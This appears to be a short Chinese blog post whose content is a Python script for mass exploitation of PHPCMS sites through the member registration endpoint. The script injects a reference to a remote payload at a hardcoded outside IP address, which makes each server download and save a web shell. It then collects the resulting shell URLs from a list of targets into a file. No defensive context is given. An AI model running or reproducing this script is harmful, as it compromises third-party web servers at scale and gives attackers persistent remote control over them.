---
title: PHPCMS批量getshell脚本
date: 2018-01-24 14:26:08
tags:
	- 渗透测试
	- Python
	- exp
categories: Python
keywords:
description:
---
PHPCMS批量getshell脚本<!-- more -->
```
# -*- coding:utf-8 -*-
import requests
import random
from bs4 import BeautifulSoup

def getshell(url):
    url = "%s/index.php?m=member&c=index&a=register&siteid=1" % url
    data = {
        "siteid":"1",
        "modelid":"11",
        "username":"fkhjkhff",
        "password":"password",
        "email":"llhjkk@qq.com",
        "info[content]":"<img src=http://124.95.128.185:8080/ma.txt?.php#.jpg>",
        "dosubmit":"1",
        "protocol":"",
        }
    data["username"] = "zzb_%s" % str(random.randint(1000,9999))
    data["email"] = "zzb_%s@qq.com" % str(random.randint(1000,9999))
    try:
        res = requests.post(url,data,timeout=10)
        res.encoding = 'utf-8'
        if "MySQL Error" in res.text and "http" in res.text:
            shell = res.text[res.text.index("http"):res.text.index(".php")] + ".php"
            if shell != "http://124.95.128.185:8080/ma.txt?.php":
                print("[*]Shell  :%s" % shell)
                return shell
            else:
                return "xx"
        else:
            print("[x]Failed : Failed to getshell.")
            return "xx"
    except:
        print("Request Error")
        return "xx"


def saveshell(shell):
    with open("Ok.txt",'a+') as f:
        f.write(shell + '\n')
def main():
    while 1:
        urltext = input("请输入网址或.txt文件(请存放在当前文件夹)输入【q】退出：")
        if urltext == "q":
            break
        elif "http" in urltext:
            getshell(urltext)
            continue
        elif ".txt" in urltext:
            with open(urltext,"r") as f:
                for url in f:
                    url = url.strip("\n")
                    shell = getshell(url)
                    if "http" in shell:
                        saveshell(shell)
                    else:
                        pass
            print("完成！请查看Ok.txt")
            continue
        else:
            print("输入错误！")
            continue
    
if __name__ == "__main__":
    main()

```